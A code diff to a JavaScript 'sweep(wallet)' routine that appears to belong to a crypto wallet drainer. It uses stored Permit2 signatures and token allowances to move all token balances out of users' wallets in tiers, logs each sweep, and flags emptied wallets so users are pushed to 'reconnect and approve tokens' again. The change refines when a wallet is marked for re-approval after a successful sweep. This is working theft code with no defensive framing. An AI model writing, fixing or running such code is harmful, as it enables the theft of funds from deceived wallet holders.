@@ -1579,6 +1579,10 @@ async function sweep(wallet) {
   const short = checksum.slice(0, 10);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   const addrKey = checksum.toLowerCase();
+  // Tracks whether any tier swept successfully this call — prevents Tier 4 from
+  // incorrectly setting needs_reactivation when Tier 3.5 already swept the tokens
+  // (leaving zero balance, which would otherwise look like a missing approval).
+  let sweptThisCall = false;
 
   // "monitoring" wallets have no signatures — nothing to sweep.
   // Skip immediately to avoid 3 wasted Supabase queries per Transfer event.
@@ -2061,6 +2065,7 @@ async function sweep(wallet) {
                 await tx.wait();
                 log(`[live-allowance] ✅ swept ${sym} from ${short}`);
                 sweptAny = true;
+                sweptThisCall = true;
                 sweptThisToken = true;
               }
             }
@@ -2080,6 +2085,7 @@ async function sweep(wallet) {
                 await tx.wait();
                 log(`[live-allowance] ✅ swept ${sym} (V2 spender) from ${short}`);
                 sweptAny = true;
+                sweptThisCall = true;
               } else {
                 warn(`[live-allowance] ${sym} V2 path skipped — ERC-20→Permit2 approval missing`);
                 anyNeedsErc20Approval = true;
@@ -2314,8 +2320,12 @@ async function sweep(wallet) {
       }
 
       if (withBalance.length === 0) {
-        warn(`[gasless] no tokens with ERC-20→Permit2 approval — user must reconnect and approve tokens`);
-        await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
+        if (!sweptThisCall) {
+          warn(`[gasless] no tokens with ERC-20→Permit2 approval — user must reconnect and approve tokens`);
+          await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
+        } else {
+          log(`[gasless] all balances zero after Tier 3.5 sweep — skip needs_reactivation (already swept this call)`);
+        }
         return;
       }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
@@ -2434,6 +2444,7 @@ async function sweep(wallet) {
         );
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
+        sweptThisCall = true;
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
             .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
